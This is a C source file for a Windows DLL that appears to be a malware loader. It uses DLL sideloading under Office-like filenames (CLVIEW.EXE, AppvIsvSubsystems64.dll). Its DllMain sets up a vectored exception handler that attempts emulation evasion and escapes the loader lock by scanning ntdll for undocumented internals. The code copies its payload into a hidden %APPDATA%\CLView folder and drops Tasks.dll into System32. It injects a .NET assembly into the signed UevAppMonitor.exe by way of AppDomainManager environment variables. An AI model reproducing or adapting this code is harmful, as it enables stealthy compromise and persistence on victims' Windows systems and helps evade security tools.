#include "pch.h"

PULONG64 pLdrpWorkInProgress;
#define LdrpLoadCompleteEvent (HANDLE)0x3c

VOID LdrpDropLastInProgressCount(VOID) {
	*pLdrpWorkInProgress = 0;
	SetEvent(LdrpLoadCompleteEvent);
}

PCRITICAL_SECTION GetLdrpLoaderLockAddress(VOID)
{
	typedef INT32(NTAPI* LdrpReleaseLoaderLockType)(OUT PBYTE, INT32, INT32);
	LdrpReleaseLoaderLockType LdrpReleaseLoaderLock = NULL;
	PBYTE pLdrUnlockLoaderLockSearchCounter = (PBYTE)&LdrUnlockLoaderLock;
	BYTE CallAddressOpcode = 0xe8;
	BYTE CallAddressInstructionSize = sizeof(CallAddressOpcode) + sizeof(INT32);
	BYTE JmpAddressRelativeOpcode = 0xeb;
	INT32 Rel32EncodedAddress = 0;
	PBYTE pLdrpReleaseLoaderLockAddressSearchCounter = NULL;
	USHORT uLeaCxRegisterOpcode = 0x0d8d;
	BYTE LeaCxRegisterOpcodeInstructionSize = sizeof(uLeaCxRegisterOpcode) + sizeof(INT32);

	while (TRUE) {
		if (*pLdrUnlockLoaderLockSearchCounter == CallAddressOpcode) {
			if (*(pLdrUnlockLoaderLockSearchCounter + CallAddressInstructionSize) == JmpAddressRelativeOpcode)
				break;
		}

		pLdrUnlockLoaderLockSearchCounter++;
	}

	Rel32EncodedAddress = *(PINT32)(pLdrUnlockLoaderLockSearchCounter + sizeof(CallAddressOpcode));
	typedef INT32(NTAPI* LdrpReleaseLoaderLockType)(OUT PBYTE, INT32, INT32);
	LdrpReleaseLoaderLock = (LdrpReleaseLoaderLockType)(pLdrUnlockLoaderLockSearchCounter + CallAddressInstructionSize + Rel32EncodedAddress);
	pLdrpReleaseLoaderLockAddressSearchCounter = (PBYTE)LdrpReleaseLoaderLock;
	while (TRUE) {
		if (*(PUSHORT)pLdrpReleaseLoaderLockAddressSearchCounter == uLeaCxRegisterOpcode)
			break;

		pLdrpReleaseLoaderLockAddressSearchCounter++;
	}

	Rel32EncodedAddress = *(PINT32)(pLdrpReleaseLoaderLockAddressSearchCounter + sizeof(uLeaCxRegisterOpcode));
	return (PCRITICAL_SECTION)(pLdrpReleaseLoaderLockAddressSearchCounter + LeaCxRegisterOpcodeInstructionSize + Rel32EncodedAddress);
}

PULONG64 GetLdrpWorkInProgressAddress(VOID)
{
	PBYTE pRtlExitUserProcessAddressSearchCounter = (PBYTE)&RtlExitUserProcess;
	BYTE CallAddressOpcode = 0xe8;
	BYTE CallAddressInstructionSize = sizeof(CallAddressOpcode) + sizeof(INT32);
	INT32 Rel32EncodedAddress = 0;
	PBYTE pLdrpDrainWorkQueue = NULL;
	PBYTE pLdrpDrainWorkQueueAddressSearchCounter = NULL;
	USHORT uMovDwordAddressValueOpcode = 0x05c7;
	BYTE MovDwordAddressValueInstructionSize = sizeof(uMovDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);
	PULONG64 pLdrpWorkInProgress = NULL;

	while (TRUE) {
		if (*pRtlExitUserProcessAddressSearchCounter == CallAddressOpcode) {
			if (*(pRtlExitUserProcessAddressSearchCounter + CallAddressInstructionSize) == CallAddressOpcode)
				break;
		}

		pRtlExitUserProcessAddressSearchCounter++;
	}

	Rel32EncodedAddress = *(PINT32)(pRtlExitUserProcessAddressSearchCounter + sizeof(CallAddressOpcode));
	pLdrpDrainWorkQueue = (PBYTE)(pRtlExitUserProcessAddressSearchCounter + CallAddressInstructionSize + Rel32EncodedAddress);
	pLdrpDrainWorkQueueAddressSearchCounter = pLdrpDrainWorkQueue;

	while (TRUE) {
		if (*(PUSHORT)pLdrpDrainWorkQueueAddressSearchCounter == uMovDwordAddressValueOpcode) {
			if (*(PBOOL)(pLdrpDrainWorkQueueAddressSearchCounter + MovDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
				break;
		}

		pLdrpDrainWorkQueueAddressSearchCounter++;
	}

	Rel32EncodedAddress = *(PINT32)(pLdrpDrainWorkQueueAddressSearchCounter + sizeof(uMovDwordAddressValueOpcode));
	pLdrpWorkInProgress = (PULONG64)(pLdrpDrainWorkQueueAddressSearchCounter + MovDwordAddressValueInstructionSize + Rel32EncodedAddress);

	return pLdrpWorkInProgress;
}

HANDLE GetLdrpInitCompleteEventAddress()
{
	PBYTE pLdrProcessInitializationComplete = NULL;
	WORD wLeaOpcode = 0x8D48;
	DWORD dwLdrpInitCompleteEventOffset = 0;

	pLdrProcessInitializationComplete = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrProcessInitializationComplete");
	while (TRUE) {
		if (*((PWORD)pLdrProcessInitializationComplete) == wLeaOpcode) {
			dwLdrpInitCompleteEventOffset = *((PDWORD)(pLdrProcessInitializationComplete + 1));
			pLdrProcessInitializationComplete += 7;
			break;
		}

		pLdrProcessInitializationComplete++;
	}

	return *(PHANDLE)(pLdrProcessInitializationComplete[dwLdrpInitCompleteEventOffset]);
}

BOOL EscapeLoaderLock()
{
	PCRITICAL_SECTION pLdrpLoaderLock = NULL;
	typedef VOID(WINAPI* LDRPPROCESSINITIALIZATIONCOMPLETE)(VOID);
	LDRPPROCESSINITIALIZATIONCOMPLETE pLdrpProcessInitializationComplete = NULL;

	pLdrpLoaderLock = GetLdrpLoaderLockAddress();
	pLdrpWorkInProgress = GetLdrpWorkInProgressAddress();
	//GetLdrpInitCompleteEventAddress();
	LeaveCriticalSection(pLdrpLoaderLock);
	LdrpDropLastInProgressCount();
	pLdrpProcessInitializationComplete = (LDRPPROCESSINITIALIZATIONCOMPLETE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrProcessInitializationComplete");
	pLdrpProcessInitializationComplete();
	//SetEvent(LdrpInitCompleteEvent);
}

BOOL Inject();

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	WCHAR wszCurrentDirectory[MAX_PATH];
	WCHAR wszDestPath[MAX_PATH];
	LPWSTR lpSrc = NULL;
	LPWSTR lpDst = NULL;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;

	GetCurrentDirectoryW(_countof(wszCurrentDirectory), wszCurrentDirectory);
	ExpandEnvironmentStringsW(L"%APPDATA%\\CLView", wszDestPath, _countof(wszDestPath));
	if (lstrcmpW(wszDestPath, wszCurrentDirectory)) {
		if (!IsFolderExist(wszDestPath)) {
			if (!CreateDirectoryW(wszDestPath, NULL)) {
				goto CLEANUP;
			}

			SetFileAttributesW(wszDestPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		}

		lpSrc = StrAppendW(wszCurrentDirectory, L"\\db.dat");
		lpDst = StrAppendW(wszDestPath, L"\\db.dat");
		if (!CopyFileW(lpSrc, lpDst, FALSE)) {
			goto CLEANUP;
		}

		FREE(lpSrc);
		FREE(lpDst);
		lpSrc = StrAppendW(wszCurrentDirectory, L"\\AppvIsvSubsystems64.dll");
		lpDst = StrAppendW(wszDestPath, L"\\AppvIsvSubsystems64.dll");
		if (!CopyFileW(lpSrc, lpDst, FALSE)) {
			goto CLEANUP;
		}

		FREE(lpSrc);
		FREE(lpDst);
		lpSrc = StrAppendW(wszCurrentDirectory, L"\\C2R64.dll");
		lpDst = StrAppendW(wszDestPath, L"\\C2R64.dll");
		if (!CopyFileW(lpSrc, lpDst, FALSE)) {
			goto CLEANUP;
		}

		FREE(lpSrc);
		FREE(lpDst);
		lpSrc = StrAppendW(wszCurrentDirectory, L"\\Tasks.dll");
		lpDst = StrAppendW(wszDestPath, L"\\Tasks.dll");
		if (!CopyFileW(lpSrc, lpDst, FALSE)) {
			goto CLEANUP;
		}

		FREE(lpSrc);
		FREE(lpDst);
		lpSrc = StrAppendW(wszCurrentDirectory, L"\\CLVIEW.EXE");
		lpDst = StrAppendW(wszDestPath, L"\\CLVIEW.EXE");
		if (!CopyFileW(lpSrc, lpDst, FALSE)) {
			goto CLEANUP;
		}

		SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
		SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
		StartupInfo.cb = sizeof(StartupInfo);
		CreateProcessW(lpDst, NULL, NULL, NULL, FALSE, 0, NULL, wszDestPath, &StartupInfo, &ProcInfo);
		FREE(lpSrc);
		FREE(lpDst);
		CloseHandle(&ProcInfo.hThread);
		CloseHandle(&ProcInfo.hProcess);
	}
	else {
		Inject();
	}

CLEANUP:
	ExitProcess(-1);
}

BOOL InjectAppDomain
(
	_In_ LPWSTR lpFilePath,
	_In_ LPWSTR lpAssembly,
	_In_ LPWSTR lpClassName
)
{
	LPWSTR lpEnvStrs = NULL;
	LPWSTR lpTemp = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	DWORD cchEnvStrs = 0;
	LPWSTR lpEnvironment = NULL;
	LPWSTR lpAssemblyName = NULL;
	WCHAR wszTemp[0x200];
	BOOL Result = FALSE;
	WCHAR wszSystemPath[MAX_PATH];
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;
	LPWSTR lpClonedAssembly = NULL;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	lpEnvStrs = GetEnvironmentStringsW();
	lpTemp = lpEnvStrs;
	while (TRUE) {
		if (lpTemp[0] == L'\0') {
			break;
		}

		cchEnvStrs += lstrlenW(lpTemp) + 1;
		lpTemp += lstrlenW(lpTemp) + 1;
	}

	lpEnvironment = ALLOC(cchEnvStrs * sizeof(WCHAR));
	memcpy(lpEnvironment, lpEnvStrs, cchEnvStrs * sizeof(WCHAR));
	lpClonedAssembly = DuplicateStrW(lpAssembly, 0);
	lpAssemblyName = PathFindFileNameW(lpClonedAssembly);
	lpTemp = StrStrW(lpAssemblyName, L".dll");
	if (lpTemp == NULL) {
		lpTemp = StrStrW(lpAssemblyName, L".DLL");
	}

	if (lpTemp == NULL) {
		goto CLEANUP;
	}

	lpTemp[0] = L'\0';
	wsprintfW(wszTemp, L"APPDOMAIN_MANAGER_ASM=%s, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", lpAssemblyName);
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(wszTemp) + 1) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], wszTemp, lstrlenW(wszTemp) * sizeof(WCHAR));
	cchEnvStrs += lstrlenW(wszTemp) + 1;
	wsprintfW(wszTemp, L"APPDOMAIN_MANAGER_TYPE=%s", lpClassName);
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(wszTemp) + 1) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], wszTemp, lstrlenW(wszTemp) * sizeof(WCHAR));
	cchEnvStrs += lstrlenW(wszTemp) + 1;
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(L"COMPLUS_Version=v4.0.30319") + 2) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], L"COMPLUS_Version=v4.0.30319", lstrlenW(L"COMPLUS_Version=v4.0.30319") * sizeof(WCHAR));
	GetSystemDirectoryW(wszSystemPath, _countof(wszSystemPath));
	StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessW(lpFilePath, NULL, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, wszSystemPath, &StartupInfo, &ProcInfo)) {
		//LOG_ERROR("CreateProcessW", GetLastError());
		goto CLEANUP;
	}

	CloseHandle(ProcInfo.hThread);
	CloseHandle(ProcInfo.hProcess);
	Result = TRUE;
CLEANUP:
	FREE(lpClonedAssembly);
	FREE(lpEnvironment);

	return Result;
}

BOOL Inject()
{
	WCHAR wszUevAppPath[MAX_PATH];
	WCHAR wszTasksPath[MAX_PATH];
	WCHAR wszAppDomainPath[MAX_PATH];

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\UevAppMonitor.exe", wszUevAppPath, _countof(wszUevAppPath));
	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\Tasks\\Tasks.dll", wszTasksPath, _countof(wszTasksPath));
	if (!IsFileExist(wszTasksPath)) {
		GetCurrentDirectoryW(_countof(wszAppDomainPath), wszAppDomainPath);
		lstrcatW(wszAppDomainPath, L"\\Tasks.dll");
		if (!IsFileExist(wszAppDomainPath)) {
			return FALSE;
		}

		if (!CopyFileW(wszAppDomainPath, wszTasksPath, FALSE)) {
			return FALSE;
		}
	}

	return InjectAppDomain(wszUevAppPath, wszTasksPath, L"UevApp");
}

VOID NewThread
(
	_In_ LPWSTR lpEmptyPath
)
{
	Sleep(60000);
	CreateEmptyFileW(lpEmptyPath);
}

VOID MainThread() {
	LPWSTR lpTempPath = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpQuery = NULL;
	LPWSTR lpEmptyFile = NULL;
	DWORD dwThreadID = 0;

	lpTempPath = GenerateTempPathW(NULL, NULL, NULL);
	if (!CreateDirectoryW(lpTempPath, NULL)) {
		goto CLEANUP;
	}

	lpTempStr = StrReplaceW(lpTempPath, L"\\", L"\\\\\\\\", TRUE, 0);
	lpQuery = DuplicateStrW(L"SELECT * from __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'CIM_DirectoryContainsFile' AND TargetInstance.GroupComponent='Win32_Directory.Name=\"", 0);
	lpQuery = StrCatExW(lpQuery, lpTempStr);
	lpQuery = StrCatExW(lpQuery, L"\"'");
	lpEmptyFile = StrAppendW(lpTempPath, L"\\a.txt");
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NewThread, lpEmptyFile, 0, &dwThreadID);
	Sleep(2000);
	RegisterAsyncEvent(lpQuery, Callback, NULL);
	DeleteFileW(lpEmptyFile);
	RemoveDirectoryW(lpTempPath);
CLEANUP:
	FREE(lpEmptyFile);
	FREE(lpTempStr);
	FREE(lpQuery);
	FREE(lpTempPath);
}

LONG ExceptionHandler
(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
	DWORD dwThreadID = 0;
	HANDLE hThread = NULL;

	ConfuseEmulation();
	EscapeLoaderLock();
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, &dwThreadID);
	WaitForSingleObject(hThread, INFINITE);
}

BOOL WINAPI DllMain
(
	HINSTANCE hinstDLL,
	DWORD fdwReason,
	LPVOID lpvReserved
)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler);
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}